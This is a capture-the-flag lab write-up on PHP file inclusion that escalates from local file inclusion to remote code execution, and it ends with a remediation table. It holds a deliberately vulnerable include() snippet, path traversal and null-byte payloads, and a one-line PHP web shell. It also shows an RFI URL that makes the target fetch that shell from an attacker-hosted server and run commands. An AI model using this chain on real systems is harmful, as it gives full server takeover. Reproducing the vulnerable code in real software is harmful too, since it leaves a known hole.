📂 Lab: File Inclusion (LFI → RFI → RCE)
📖 Overview
This lab focuses on identifying and exploiting improper file handling in PHP applications. The goal is to move from Local File Inclusion (LFI) to Remote File Inclusion (RFI), eventually achieving Remote Code Execution (RCE).

🔍 Vulnerability Analysis
The application uses the following vulnerable PHP code:

PHP

$profile = $_REQUEST['file'];
include($profile);
[!CAUTION] The Risk: The include() function directly processes user-controlled input without sanitization. This allows for:

Reading sensitive system files (LFI/Path Traversal).

Executing external scripts if allow_url_include is enabled (RFI).

Execution of arbitrary PHP code (RCE).

🚩 Challenge Walkthrough
1️⃣ Challenge 1: LFI via POST
Scenario: The input is not accepted via GET parameters. The backend expects a POST request.

Method:

Intercepted the request and changed the form method from GET to POST.

Submitted the payload via the file parameter.

Payload: /etc/flag1

Result: ✅ Flag 1 Retrieved

2️⃣ Challenge 2: Cookie Injection & Path Traversal
Scenario: Authorization is based on a cookie, and the application appends .php to the input.

Analysis: Cookie THM=Guest. Changing it to Admin grants access, but the server expects a file path.

Exploitation: Used Path Traversal to escape the directory and a Null Byte (%00) to terminate the string and bypass the .php extension.

Payload (Cookie): ../../../../etc/flag2%00

Result: ✅ Flag 2: c00k13_i5_yuMmy1

3️⃣ Challenge 3: Multi-Vector Inclusion (POST + Cookie + Token)
Scenario: The application checks multiple inputs simultaneously.

Exploitation: Injected the traversal payload into both the POST file parameter and the token cookie to satisfy backend requirements.

Payload: ../../../../etc/flag3%00

Result: ✅ Flag 3 Retrieved

💥 Path to RCE (Remote Code Execution)
Objective: Achieve command execution on the target host by hosting a malicious script.

Step 1: Prepare the Web Shell
Created a simple PHP script to execute system commands:

PHP

<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>
Step 2: Host the Payload
Started a local Python HTTP server on the attacker machine (AttackBox):

Bash

python3 -m http.server 9001
Step 3: Trigger RFI
Exploited the playground.php page by pointing the file parameter to the hosted malicious script:

Plaintext

http://<TARGET-IP>/playground.php?file=http://<ATTACKBOX-IP>:9001/shell.php&cmd=hostname
✅ Result:

Command Executed: hostname

Output: lfi-vm-thm-f8c5b1a78692

Impact: Full System Compromise achieved.

🛡️ Remediation & Best Practices
Mitigation	Action
Disable Dangerous Settings	Set allow_url_include = Off in php.ini.
Input Validation	Use a whitelist of allowed files instead of direct user input.
Path Normalization	Use filesystem functions to validate the path and prevent ../ attacks.
Filesystem Security	Run the web server with minimal privileges (Principle of Least Privilege).

Экспортировать в Таблицы

🏁 Conclusion
The lab successfully demonstrated the critical transition from simple file reading to full server takeover. Understanding how to manipulate different input vectors (Cookies, POST, Tokens) is essential for modern web penetration testing.

Author: CyberDat | Date: January 2026

